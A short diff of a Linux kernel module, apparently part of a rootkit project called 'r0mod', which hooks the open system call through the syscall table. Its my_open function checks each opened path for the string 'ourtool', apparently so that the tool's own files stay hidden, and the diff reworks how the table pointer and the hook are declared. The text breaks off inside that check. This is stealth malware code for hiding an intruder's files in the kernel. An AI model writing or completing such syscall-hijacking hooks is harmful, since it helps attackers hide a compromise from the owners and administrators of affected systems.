@@ -1,31 +1,24 @@
-#include <linux/init.h>
+
 #include <linux/module.h>
 #include <linux/kernel.h>
-#include <asm/unistd.h>
-#include <asm/fcntl.h>
-#include <asm/errno.h>
+
 #include <linux/slab.h>
-#include <linux/types.h>
-#include <linux/dirent.h>
-#include <linux/string.h>
-#include <linux/fs.h>
-
-extern void *sys_call_table[];
-
-void *sys_call_table[10];
+#include <linux/unistd.h>
 
 #include <r0mod/global.h>
 
-int (*orig_open)(const char *pathname, int flag, mode_t mode);
+void **sys_call_table;
 
-int my_open(const char *pathname, int flag, mode_t mode)
+asmlinkage int (*orig_open)(const char *pathname, int flag, mode_t mode);
+
+asmlinkage int my_open(const char *pathname, int flag, mode_t mode)
 {
     char hide[] = "ourtool";
     char *kernel_pathname;
 
     // Convert to kernel space
     kernel_pathname = (char *)kmalloc(256, GFP_KERNEL);
-    memcpy_fromio(kernel_pathname, pathname, 255);
+    memcpy(kernel_pathname, pathname, 255);
     if(strstr(kernel_pathname, (char *)&hide) != NULL)
     {
         kfree(kernel_pathname);
